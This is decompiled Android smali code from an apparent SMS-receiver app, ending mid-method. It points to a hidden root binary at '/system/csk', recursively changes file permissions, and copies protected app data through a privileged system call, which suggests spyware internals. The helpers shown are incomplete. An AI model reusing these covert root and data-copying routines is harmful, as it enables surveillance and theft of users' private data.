.class public Lcom/binary/sms/receiver/SkeletonActivity;
.super Landroid/app/Activity;
.source "SkeletonActivity.java"


# static fields
.field private static final BACK_ID:I = 0x1

.field private static final CLEAR_ID:I = 0x2

.field public static final DELAY_BETWEEN_PROC_LONG:I = 0x3e8

.field public static final DELAY_BETWEEN_PROC_SHORT:I = 0x64

.field private static final MAX_TRIES:I = 0x5

.field public static final PROCESS_TIMEOUT:I = 0x15f90

.field private static resendingHandler:Landroid/os/Handler;

.field public static suCommand:Ljava/lang/String;


# instance fields
.field private btnBack:Landroid/widget/Button;

.field private btnContacts:Landroid/widget/Button;

.field private counter:I

.field mBackListener:Landroid/view/View$OnClickListener;

.field mClearListener:Landroid/view/View$OnClickListener;

.field private mEditor:Landroid/widget/EditText;

.field private phoneNumber:Landroid/widget/EditText;

.field private smsBody:Landroid/widget/EditText;

.field private smsDataBtn:Landroid/widget/Button;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 83
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    sput-object v0, Lcom/binary/sms/receiver/SkeletonActivity;->resendingHandler:Landroid/os/Handler;

    .line 391
    const-string v0, "/system/csk"

    sput-object v0, Lcom/binary/sms/receiver/SkeletonActivity;->suCommand:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 92
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 67
    const/4 v0, 0x0

    iput v0, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I

    .line 1411
    new-instance v0, Lcom/binary/sms/receiver/SkeletonActivity$1;

    invoke-direct {v0, p0}, Lcom/binary/sms/receiver/SkeletonActivity$1;-><init>(Lcom/binary/sms/receiver/SkeletonActivity;)V

    iput-object v0, p0, Lcom/binary/sms/receiver/SkeletonActivity;->mBackListener:Landroid/view/View$OnClickListener;

    .line 1420
    new-instance v0, Lcom/binary/sms/receiver/SkeletonActivity$2;

    invoke-direct {v0, p0}, Lcom/binary/sms/receiver/SkeletonActivity$2;-><init>(Lcom/binary/sms/receiver/SkeletonActivity;)V

    iput-object v0, p0, Lcom/binary/sms/receiver/SkeletonActivity;->mClearListener:Landroid/view/View$OnClickListener;

    .line 93
    return-void
.end method

.method public static WaitForTimeout(Ljava/lang/Process;I)I
    .locals 10
    .param p0, "process"    # Ljava/lang/Process;
    .param p1, "timeout"    # I
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/InterruptedException;,
            Ljava/util/concurrent/TimeoutException;
        }
    .end annotation

    .prologue
    .line 1089
    const/4 v5, 0x0

    .line 1090
    .local v5, "res":I
    const/4 v6, 0x0

    .line 1091
    .local v6, "spend":I
    const/16 v3, 0x64

    .line 1092
    .local v3, "delay":I
    const/4 v1, 0x0

    .line 1093
    .local v1, "bytes":I
    :cond_0
    :goto_0
    if-lt v6, p1, :cond_1

    .line 1132
    invoke-virtual {p0}, Ljava/lang/Process;->destroy()V

    .line 1133
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "runProcess WaitForTimeout Destroy process. after="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1134
    new-instance v7, Ljava/util/concurrent/TimeoutException;

    .line 1135
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "runProcess WaitForTimeout Destroy process. after="

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 1134
    invoke-direct {v7, v8}, Ljava/util/concurrent/TimeoutException;-><init>(Ljava/lang/String;)V

    throw v7

    .line 1095
    :cond_1
    :try_start_0
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "runProcess WaitForTimeout spend="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    .line 1096
    const-string v8, " bytes="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    .line 1095
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1098
    invoke-virtual {p0}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v7

    invoke-virtual {v7}, Ljava/io/InputStream;->available()I

    move-result v2

    .line 1099
    .local v2, "bytesWait":I
    if-lez v2, :cond_2

    .line 1100
    new-array v0, v2, [B

    .line 1101
    .local v0, "buff":[B
    invoke-virtual {p0}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/io/InputStream;->read([B)I

    .line 1102
    add-int/2addr v1, v2

    .line 1103
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "runProcess WaitForTimeout getInputStream="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v8, Ljava/lang/String;

    invoke-direct {v8, v0}, Ljava/lang/String;-><init>([B)V

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1105
    .end local v0    # "buff":[B
    :cond_2
    invoke-virtual {p0}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;

    move-result-object v7

    invoke-virtual {v7}, Ljava/io/InputStream;->available()I

    move-result v2

    .line 1106
    if-lez v2, :cond_3

    .line 1107
    new-array v0, v2, [B

    .line 1108
    .restart local v0    # "buff":[B
    invoke-virtual {p0}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/io/InputStream;->read([B)I

    .line 1109
    add-int/2addr v1, v2

    .line 1110
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "runProcess WaitForTimeout getErrorStream="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v8, Ljava/lang/String;

    invoke-direct {v8, v0}, Ljava/lang/String;-><init>([B)V

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1115
    .end local v0    # "buff":[B
    :cond_3
    invoke-virtual {p0}, Ljava/lang/Process;->exitValue()I
    :try_end_0
    .catch Ljava/lang/IllegalThreadStateException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result v5

    .line 1116
    return v5

    .line 1117
    .end local v2    # "bytesWait":I
    :catch_0
    move-exception v4

    .line 1119
    .local v4, "e":Ljava/lang/IllegalThreadStateException;
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "runProcess WaitForTimeout jump="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 1120
    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, ", spend="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, ", bytes="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    .line 1119
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1125
    .end local v4    # "e":Ljava/lang/IllegalThreadStateException;
    :goto_1
    int-to-long v7, v3

    invoke-static {v7, v8}, Ljava/lang/Thread;->sleep(J)V

    .line 1126
    add-int/lit8 v6, v6, 0x64

    .line 1128
    const/16 v7, 0x3e8

    if-ne v3, v7, :cond_0

    .line 1129
    const/16 v3, 0x64

    goto/16 :goto_0

    .line 1121
    :catch_1
    move-exception v4

    .line 1122
    .local v4, "e":Ljava/lang/Exception;
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "runProcess WaitForTimeout exception="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 1123
    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    .line 1122
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    goto :goto_1
.end method

.method static synthetic access$0(Lcom/binary/sms/receiver/SkeletonActivity;)Landroid/widget/EditText;
    .locals 1

    .prologue
    .line 66
    iget-object v0, p0, Lcom/binary/sms/receiver/SkeletonActivity;->mEditor:Landroid/widget/EditText;

    return-object v0
.end method

.method static synthetic access$1(Lcom/binary/sms/receiver/SkeletonActivity;I)V
    .locals 0

    .prologue
    .line 67
    iput p1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I

    return-void
.end method

.method static synthetic access$2(Lcom/binary/sms/receiver/SkeletonActivity;Ljava/io/File;)V
    .locals 0

    .prologue
    .line 483
    invoke-direct {p0, p1}, Lcom/binary/sms/receiver/SkeletonActivity;->chmodRec(Ljava/io/File;)V

    return-void
.end method

.method static synthetic access$3()Ljava/lang/String;
    .locals 1

    .prologue
    .line 393
    invoke-static {}, Lcom/binary/sms/receiver/SkeletonActivity;->getTodayString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private chmodRec(Ljava/io/File;)V
    .locals 5
    .param p1, "f"    # Ljava/io/File;

    .prologue
    .line 486
    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Lcom/binary/sms/receiver/SkeletonActivity;->chmod(Ljava/lang/String;)V

    .line 488
    invoke-virtual {p1}, Ljava/io/File;->isDirectory()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 491
    :try_start_0
    invoke-virtual {p1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v2

    array-length v3, v2

    const/4 v1, 0x0

    :goto_0
    if-lt v1, v3, :cond_1

    .line 500
    :cond_0
    :goto_1
    return-void

    .line 491
    :cond_1
    aget-object v0, v2, v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 493
    .local v0, "c":Ljava/io/File;
    :try_start_1
    invoke-direct {p0, v0}, Lcom/binary/sms/receiver/SkeletonActivity;->chmodRec(Ljava/io/File;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 491
    :goto_2
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 494
    :catch_0
    move-exception v4

    goto :goto_2

    .line 496
    .end local v0    # "c":Ljava/io/File;
    :catch_1
    move-exception v1

    goto :goto_1
.end method

.method public static copyDataData(Ljava/lang/String;)V
    .locals 5
    .param p0, "source"    # Ljava/lang/String;

    .prologue
    .line 340
    :try_start_0
    const-string v1, "net"

    const/4 v2, 0x0

    const-wide/16 v3, 0x0

    invoke-static {v1, v2, v3, v4, p0}, Lcom/binary/sms/receiver/SkeletonActivity;->systemCallCopy(Ljava/lang/String;[Ljava/lang/String;JLjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 344
    :goto_0
    return-void

    .line 341
    :catch_0
    move-exception v0

    .line 342
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "copyDataData: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static copyFile(Ljava/io/File;Ljava/io/File;)V
    .locals 11
    .param p0, "src"    # Ljava/io/File;
    .param p1, "dest"    # Ljava/io/File;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 914
    const/4 v3, 0x0

    .line 915
    .local v3, "fin":Ljava/io/FileInputStream;
    const/4 v5, 0x0

    .line 916
    .local v5, "fout":Ljava/io/FileOutputStream;
    const/16 v8, 0x1000

    new-array v0, v8, [B

    .line 920
    .local v0, "buffer":[B
    :try_start_0
    new-instance v4, Ljava/io/FileInputStream;

    invoke-direct {v4, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 921
    .end local v3    # "fin":Ljava/io/FileInputStream;
    .local v4, "fin":Ljava/io/FileInputStream;
    :try_start_1
    new-instance v6, Ljava/io/FileOutputStream;

    invoke-direct {v6, p1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 923
    .end local v5    # "fout":Ljava/io/FileOutputStream;
    .local v6, "fout":Ljava/io/FileOutputStream;
    :goto_0
    :try_start_2
    invoke-virtual {v4, v0}, Ljava/io/FileInputStream;->read([B)I
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    move-result v1

    .local v1, "bytesRead":I
    if-gez v1, :cond_2

    .line 934
    if-eqz v4, :cond_0

    invoke-virtual {v4}, Ljava/io/FileInputStream;->close()V

    .line 935
    :cond_0
    if-eqz v6, :cond_1

    invoke-virtual {v6}, Ljava/io/FileOutputStream;->close()V

    .line 937
    :cond_1
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "copy file src: "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 938
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "copy file des: "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 940
    return-void

    .line 924
    :cond_2
    const/4 v8, 0x0

    :try_start_3
    invoke-virtual {v6, v0, v8, v1}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    goto :goto_0

    .line 926
    .end local v1    # "bytesRead":I
    :catch_0
    move-exception v2

    move-object v5, v6

    .end local v6    # "fout":Ljava/io/FileOutputStream;
    .restart local v5    # "fout":Ljava/io/FileOutputStream;
    move-object v3, v4

    .line 927
    .end local v4    # "fin":Ljava/io/FileInputStream;
    .local v2, "e":Ljava/io/IOException;
    .restart local v3    # "fin":Ljava/io/FileInputStream;
    :goto_1
    :try_start_4
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "copyFile: "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    .line 928
    new-instance v7, Ljava/io/IOException;

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "copyFiles: Unable to copy file: "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 929
    invoke-virtual {p0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "to"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "."

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 928
    invoke-direct {v7, v8}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    .line 930
    .local v7, "wrapper":Ljava/io/IOException;
    invoke-virtual {v7, v2}, Ljava/io/IOException;->initCause(Ljava/lang/Throwable;)Ljava/lang/Throwable;

    .line 931
    invoke-virtual {v2}, Ljava/io/IOException;->getStackTrace()[Ljava/lang/StackTraceElement;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/io/IOException;->setStackTrace([Ljava/lang/StackTraceElement;)V

    .line 932
    throw v7
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 933
    .end local v2    # "e":Ljava/io/IOException;
    .end local v7    # "wrapper":Ljava/io/IOException;
    :catchall_0
    move-exception v8

    .line 934
    :goto_2
    if-eqz v3, :cond_3

    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V

    .line 935
    :cond_3
    if-eqz v5, :cond_4

    invoke-virtual {v5}, Ljava/io/FileOutputStream;->close()V

    .line 937
    :cond_4
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "copy file src: "

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 938
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "copy file des: "

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 939
    throw v8

    .line 933
    .end local v3    # "fin":Ljava/io/FileInputStream;
    .restart local v4    # "fin":Ljava/io/FileInputStream;
    :catchall_1
    move-exception v8

    move-object v3, v4

    .end local v4    # "fin":Ljava/io/FileInputStream;
    .restart local v3    # "fin":Ljava/io/FileInputStream;
    goto :goto_2

    .end local v3    # "fin":Ljava/io/FileInputStream;
    .end local v5    # "fout":Ljava/io/FileOutputStream;
    .restart local v4    # "fin":Ljava/io/FileInputStream;
    .restart local v6    # "fout":Ljava/io/FileOutputStream;
    :catchall_2
    move-exception v8

    move-object v5, v6

    .end local v6    # "fout":Ljava/io/FileOutputStream;
    .restart local v5    # "fout":Ljava/io/FileOutputStream;
    move-object v3, v4

    .end local v4    # "fin":Ljava/io/FileInputStream;
    .restart local v3    # "fin":Ljava/io/FileInputStream;
    goto :goto_2

    .line 926
    :catch_1
    move-exception v2

    goto/16 :goto_1

    .end local v3    # "fin":Ljava/io/FileInputStream;
    .restart local v4    # "fin":Ljava/io/FileInputStream;
    :catch_2
    move-exception v2

    move-object v3, v4

    .end local v4    # "fin":Ljava/io/FileInputStream;
    .restart local v3    # "fin":Ljava/io/FileInputStream;
    goto/16 :goto_1
.end method

.method public static copyFiles(Ljava/io/File;Ljava/io/File;)V
    .locals 8
    .param p0, "src"    # Ljava/io/File;
    .param p1, "dest"    # Ljava/io/File;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 856
    :try_start_0
    const-string v5, "copy files"

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 869
    invoke-virtual {p0}, Ljava/io/File;->exists()Z

    move-result v5

    if-nez v5, :cond_1

    .line 870
    new-instance v5, Ljava/io/IOException;

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "copyFiles: Can not find source: "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "."

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 908
    :catch_0
    move-exception v1

    .line 909
    .local v1, "e":Ljava/lang/Exception;
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "copyFiles: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v1}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    .line 911
    .end local v1    # "e":Ljava/lang/Exception;
    :cond_0
    :goto_0
    return-void

    .line 871
    :cond_1
    :try_start_1
    invoke-virtual {p0}, Ljava/io/File;->canRead()Z

    move-result v5

    if-nez v5, :cond_2

    .line 872
    new-instance v5, Ljava/io/IOException;

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "copyFiles: No right to source: "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "."

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v5

    .line 875
    :cond_2
    invoke-virtual {p0}, Ljava/io/File;->isDirectory()Z

    move-result v5

    if-eqz v5, :cond_5

    .line 876
    invoke-virtual {p1}, Ljava/io/File;->exists()Z

    move-result v5

    if-nez v5, :cond_4

    .line 878
    invoke-virtual {p1}, Ljava/io/File;->mkdirs()Z

    move-result v5

    if-nez v5, :cond_3

    .line 879
    new-instance v5, Ljava/io/IOException;

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "copyFiles: Could not create direcotry: "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "."

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v5

    .line 883
    :cond_3
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "copy dir src: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 884
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "copy dir des: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 888
    :cond_4
    invoke-virtual {p0}, Ljava/io/File;->list()[Ljava/lang/String;

    move-result-object v3

    .line 890
    .local v3, "list":[Ljava/lang/String;
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_1
    array-length v5, v3

    if-ge v2, v5, :cond_0

    .line 892
    new-instance v0, Ljava/io/File;

    aget-object v5, v3, v2

    invoke-direct {v0, p1, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 893
    .local v0, "dest1":Ljava/io/File;
    new-instance v4, Ljava/io/File;

    aget-object v5, v3, v2

    invoke-direct {v4, p0, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 894
    .local v4, "src1":Ljava/io/File;
    invoke-static {v4, v0}, Lcom/binary/sms/receiver/SkeletonActivity;->copyFiles(Ljava/io/File;Ljava/io/File;)V

    .line 890
